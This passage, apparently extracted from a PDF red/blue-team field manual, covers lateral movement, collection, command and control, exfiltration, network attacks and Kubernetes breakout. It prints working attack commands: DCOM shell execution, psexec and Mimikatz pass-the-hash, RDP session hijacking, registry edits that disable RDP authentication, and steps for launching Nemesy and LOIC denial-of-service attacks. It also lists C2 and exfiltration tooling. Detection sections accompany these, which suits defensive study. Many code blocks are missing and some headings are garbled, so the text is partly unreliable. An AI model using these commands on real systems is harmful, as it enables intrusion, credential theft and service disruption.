2.9.1.3Distributed Component Object Model (DCOM)
Get-ChildItem
'registry::HKEY_CLASSES_ROOT\WOW6432Node\CLSID\
{49B2791A-B1AE-4C90-9B8E-E860BA07F889}'
$obj =
[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.A
"))
$obj.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c
","7")
2.9.1.4Administrative Tools
Empire:
(Empire: ) > usemodule
situational_awareness/network/find_localadmin_access (Empire:
) execute
take note of results (Empire: ) back
(Empire: ) usemodule lateral_movement/invoke_psexec (Empire:
) set ComputerName 
(Empire: ) set Listener  (Empire: ) execute
2.9.1.5Pass the Hash
Empire:
(Empire: ) creds (Empire: ) pth 
Metasploit:
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set RHOST 
msf exploit(psexec) > set SMBUser 
msf exploit(psexec) > set SMBPass 
msf exploit(psexec) > exploit
Mimikatz:
> sekurlsa::pth /user: /domain: /ntlm:
2.9.1.6Remote Desktop hijack (requires system)
query user :: check for system
sc.exe create sesshijack binpath= "cmd.exe /k tscon 1337 /dest:rdp- tcp#55"
net start sesshijack
sc.exe delete sesshijack
2.9.1.7Remote Desktop Tunnel
reg add "HKLM\SYSTEM\CurrentControlSet\Control
\TerminalServer\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD
/d 443 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"
/v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control \Terminal
Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD
/d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
net stop TermService
net start TermService
2.9.1.8Public Services
Once inside a network there may be servers and services that are only visible
to the internal network, following the Discovery methods you may find an
exploitable service.
2.9.2 DETECTION
Detecting lateral movement from a single host can be very difficult, and the
best results will come from using a tool that shows network data and all the
hosts on the network, but there are techniques that can help you find lateral
movement form a single host.
2.9.2.1Using logs to detect Pass the Hash
Method 1: Windows Event Logs
Passing the hash will generate 2 Event ID 4776 on the Domain Controller,
the first event 4776 is generated during the authentication of the victim
computer, the second event 4776 indicates the validation of the account from
the originating computer (infected host), when accessing the target
workstation (victim).
Method 2: Sysmon
2.9.2.2Detect the use of PsExec
With the use of PsExec you have to accept the EULA agreement, you can
check for the registry key of EulaAccepted to see if the value is equal to 1,
which means PsExec has been used. This could be admin activity.
2.10COLLECTION
The adversary is trying to gather data of interest to their goal.
Collection consists of techniques adversaries may use to gather information
and the sources information is collected from that are relevant to following
through on the adversary's objectives. Frequently, the next goal after
collecting data is to steal (exfiltrate) the data. Common target sources include
various drive types, browsers, audio, video, and email. Common collection
methods include capturing screenshots and keyboard input.
2.10.1 Relevant Information - Attack
2.10.1.1 Screen Capture
Empire:
Meterpreter:
Powershell:
2.10.1.2 Webcam Recorder
Empire:
Meterpreter:
2.10.1.3 Clipboard Data
Empire:
Meterpreter:
Powershell:
2.10.1.4 Keylogging
Empire:
Meterpreter:
2.10.1.5 Email Collection
Get Microsoft outlook inbox written by ed wilson, msft and is available at
https://gallery.technet.microsoft.com/scriptcenter/af63364d-8b04-473f- 9a98-
b5ab37e6b024
2.10.2 DETECTION
2.10.2.1 Find Large Files ( Greater than XXXXXXXXX Bytes)
2.10.2.2 Find files newer than date
2.10.3 MITIGATION
2.10.3.1 Keylogging
There are a few easy methods to defeat keyloggers, as most keyloggers are
attempting to steal user credentials.
1. Voice to text conversion
Using speech to text will defeat keyloggers as no keystrokes will have been
made to enter your credentials
2. On Screen keyboard
Using the on screen keyboard with prevent most keyloggers from capturing
your credentials
2.11COMMAND AND CONTROL
The adversary is trying to communicate with compromised systems to control
them.
Command and Control consists of techniques that adversaries may use to
communicate with systems under their control within a victim network.
Adversaries commonly attempt to mimic normal, expected traffic to avoid
detection. There are many ways an adversary can establish command and
control with various levels of stealth depending on the victim’s network
structure and defenses.
2.11.1 RELEVANT INFORMATION
2.11.1.1 Common C2 Ports
Ports that are commonly used for normal network activity are often targeted
to blend in with network traffic, avoid firewalls and intrusion detection
systems, such as ports:
TCP:80 (HTTP)
TCP:443 (HTTPS)
TCP:25 (SMTP)
TCP/UDP:53 (DNS)
2.11.2 ATTACK
2.11.2.1 Port Knocking
A common way to hide a port is by using port knocking, to port knock using
powershell as the client the following script can be used
To use windows as the server for port knocking, Ivano Malavolta, developed
WinKnocks written in Java, a server/client that is available at
http://winknocks.sourceforge.net/
2.11.2.2 Remote Access Tools
Remote access tools are needed to command and control a host once it has
been infected, there are many tools out there but a few of them are listed
below.
Name Language Link
Cobalt Strike propriatary https://cobaltstrike.com/
Empire PowerShell2.0 https://github.com/EmpireProject/Em
Metasploit
Ruby https://github.com/rapid7/metasploit-
Framework
Python, IronPython,
SILENTTRINITY
C#/.NET https://github.com/byt3bl33d3r/SILE
Pupy Python https://github.com/n1nj4sec/pupy
Koadic JavaScript https://github.com/zerosum0x0/koadi
PoshC2 PowerShell https://github.com/nettitude/PoshC2_
Gcat Python https://github.com/byt3bl33d3r/gcat
TrevorC2 Python https://github.com/trustedsec/trevorc2
Merlin Golang https://github.com/Ne0nd0g/merlin
Quasar C# https://github.com/quasar/QuasarRAT
Covenant .NET https://github.com/cobbr/Covenant
FactionC2 C#, Python https://github.com/FactionC2/
DNScat2 Ruby https://github.com/iagox86/dnscat2
Sliver Golang https://github.com/BishopFox/sliver
EvilOSX Python https://github.com/Marten4n6/EvilOS
EggShell Python https://github.com/neoneggplant/Egg
Evilgrade Multiple https://github.com/infobyte/evilgrade
RedCloud Docker https://github.com/khast3x/Redcloud
2.11.2.3 C2 Redirector
Using a linux redirector with socat installed
Point windows payload remote host to redirector IP and port, recommend
adding rules to Iptables to allow only remote host and C2 communications to
protect from scanning and hack-back
2.11.2.4 Proxies
Setup NGINX proxy for Armitage/Metasploit
Install NGINX and backup conf file
Create config file for Armitage
Setup system for use
2.11.2.5 Web Services
Online service, such as social media can be a great way to conduct command
and control (C2) as they can easily blend in with normal traffic.
An example of this is using twitter, which is available at
https://github.com/PaulSec/twittor
This requires a twitter developer account, and can be easily used to generate
meterpreter or powershell empire agents.
Another C2 mechanism is using Gcat which uses gmail to blend in with
normal traffic. Gcat is available at: https://github.com/byt3bl33d3r/gcat
2.11.2.6 Remote file copy
For more information on how to write profiles and use existing profiles:
https://bluescreenofjeff.com/2017-03-01-how-to-make-communication-
profiles-for-empire/
2.11.3 Detection
Finding an active Command and Control on a host can prove to be rather
difficult, typically Command and Control is either discovered forensically
after the exploitation has been discovered or can be found over the network
by looking for beacons and commands. While not impossible the best way is
either through the use of an antivirus or by looking for persistence
mechanisms that would restart the Command and Control.
2.11.3.1 Detect C&C with hard coded IP addresses
This technique can be used to discover Command and Control while they are
running on a system. Command and Control is typically very difficult to
discover during its execution phase. During execution phase you can also use
network traffic to catch the command and control signals. This method
requires you to gather IP addresses that have communicated with the host, the
longer the better. Then will require a memory dump file, which we will then
run volatility against the memory dump using the IP address as the search
string. We are looking for hard coded IP addresses, if any are found this
would indicate a Command and Control implant.
This method is going to need a few prerequisites
1. All external IP addresses using tshark and powershell
2. A memory dump from the host using dumpit can be downloaded
from:
https://github.com/thimbleweed/All-In-
USB/raw/master/utilities/DumpIt/DumpIt.exe
3. Use volatility to get any hardcoded IP addresses from RAM
2.11.3.2 DNS Logs
2.12EXFILTRATION
The adversary is trying to steal data.
Exfiltration consists of techniques that adversaries may use to steal data from
your network. Once they’ve collected data, adversaries often package it to
avoid detection while removing it. This can include compression and
encryption. Techniques for getting data out of a target network typically
include transferring it over their command and control channel or an alternate
channel and may also include putting size limits on the transmission.
2.12.1 ATTACK
2.12.1.1 Data Compression
Powershell
WinRAR
2.12.1.2 Data Encryption
WinRAR
Powershell
2.12.1.3 Data over C2
Empire:
Meterpreter:
2.12.1.4 Web Services
Create a cloud-based drive, such as google drive or dropbox, and upload files
to this drive. It is important to note that if you have a good idea of normal
network traffic that you blend in with normal, for example if only small
amounts of data are uploaded infrequently follow that pattern. This can also
be accomplished with a tool such as Empire and dropbox:
2.12.1.5 Data over DNS
https://github.com/Arno0x/DNSExfiltrator
2.12.1.6 Data over ICMP (ptunnel-ng)
Server
Client
2.12.1.7 Data Obfuscation
https://github.com/TryCatchHCF/Cloakify
2.12.1.8 Data exfiltration over Social Media
Social media is extremely common traffic on a network, and often you can
upload and download information through these platforms, this is a great
tactic as the traffic will blend in with all the others using social media.
Website Amount of Data
Youtube 20GB as a video
Flickr 200MB as an image, up to 1TB
Vimeo 5GB of videos per week; paid subscription required to retain original
file
Facebook 25MB raw file for groups, 1GB as video* if verified profile, text posts
LinkedIn 100MB Office documents
DeviantArt 60MB as an image, up to 250MB
Pinterest 10MB as an image
Tumblr 10MB as an image, 150 photo posts allowed per day, text posts
2.12.2 DETECTION
Enable DNS logging using Powershell
DNS logs at a host level can be invaluable, this will allow you to see what
DNS requests your host has been making, and let you see if the requests and
replies are formed properly
2.12.2.1 Look at Apps Using Data
In windows search for “Data Usage” > then go to view data usage per app.
This will show you apps using data, if you see an app that should not be using
data, i.e. notepad, it is worth looking into.
2.12.2.2 Detect Alternate Data Stream
2.12.2.3 Find compressed files
Method 1: Find by Extension
This method relies on the file extension, which can be changed
Option 2: Find by File Type
This method utilizes the magic number, which is a file header that identifies
the file
2.12.2.4 Find encrypted files
Option 1: Using cipher
Option 2: Using Entropy
This is an example of a possible way to find high entropy files across the OS,
while if ran on every file this list would be quite large, however if you pass a
trusted list you can make it quite easy to find new high entropy files.
Data Type Average Entropy
Plain Text 4.347
Native Executable 5.099
Packed Executable 6.801
Encrypted Executable 7.175
2.12.2.5 Find large files
3 N
ETWORK
3.1 GENERAL INFORMATION
3.1.1 Common Ports
3.2 IPV4
3.2.1 IPv4 Header
3.2.2 IPv4 ICMP Header
3.2.3 IPv4 Subnet Class Ranges
3.2.3.1IPv4 Subnets
3.2.4 ICMPv4 Type Codes
3.2.5 IPv6
3.2.5.1IPv6 Header
3.2.5.2IPv6 ICMP Header
3.2.5.3ICMPv6 Type Code
3.2.6 TCP Header
3.2.7 UDP Header
3.2.8 DNS Header
3.2.9 ARP Header
3.2.10 TTL and Windows Size by OS
Operating System Time To Live TCP Window Size
Linux (Kernel 2.4 and 2.6) 64 5840
Google Linux 64 5720
FreeBSD 64 65535
Windows XP 128 65535
Windows Vista + 128 8192
Cisco iOS 12.4 255 4128
3.2.11 Common Wireshark Filters
Filter Desciprtion
eth.addr == XX:XX:XX:XX:XX:XX Filter by mac address
eth.src == XX:XX:XX:XX:XX:XX Filter by source mac address
eth.dst == XX:XX:XX:XX:XX:XX Filter by destination mac address
eth.vlan.id = XX Filter by VLAN id
ip.addr == X.X.X.X Filter by IP X.X.X.X
ip.src == X.X.X.X Filter by source IP X.X.X.X
ip.dst == X.X.X.X Filter by destination IP X.X.X.X
tcp.port = XX Filter by TCP port XX
tcp.srcport = XX Filter by TCP source port XX
tcp.dstport = XX Filter by TCP destination port XX
udp.port = XX Filter by UDP port XX
udp.srcport = XX Filter by UDP source port XX
udp.dstport = XX Filter by UDP destination port XX
http Filter HTTP traffic
dns Filter DNS traffic
http.user_agent contains  Filter by User Agent browser string
!(arp or icmp or dns) Filter out arp, icmp and dns traffic
tcp stream  Filter by TCP stream
3.3 ATTACK
3.3.1 ARP Cache Poisoning
3.3.2 DNS Spoofing
3.3.3 Switch Flood
3.3.4 Rogue IPv6 Attack
If a network operates on IPv4 and no IPv6 servers are in place the following
works for windows networks
3.3.5 Network Scans
3.3.6 Denial of Service
3.3.6.1Nemesy
Download Nemesy from :
https://packetstormsecurity.com/files/download/25599/nemesy13.zip
Note: Will most likely have to create an exception for your antivirus
Enter Victim IP address and set packet size and delay, Number 0 is infinite,
click send, whenever you are done launching attack click stop.
3.3.6.2LOIC
Download Low Orbit Ion Cannon (LOIC) enter the URL or IP address select
options for the type of attack that you want to perform and Launch attack
3.3.6.3SYN flood
3.4 DETECTION
Snort (Warning: rules need to be tested before deployed and can be very
noisy)
4 C B
ONTAINER REAKOUT
4.1 KUBERNETES
4.1.1 Determine if you are on kubernetes cluster
4.1.2 Kubernetes enumeration
4.1.3 Kubernetes Pod RBAC Breakout
4.1.3.1Kubernetes Cheat Sheet
Command Description
kubectl get pods List all current pods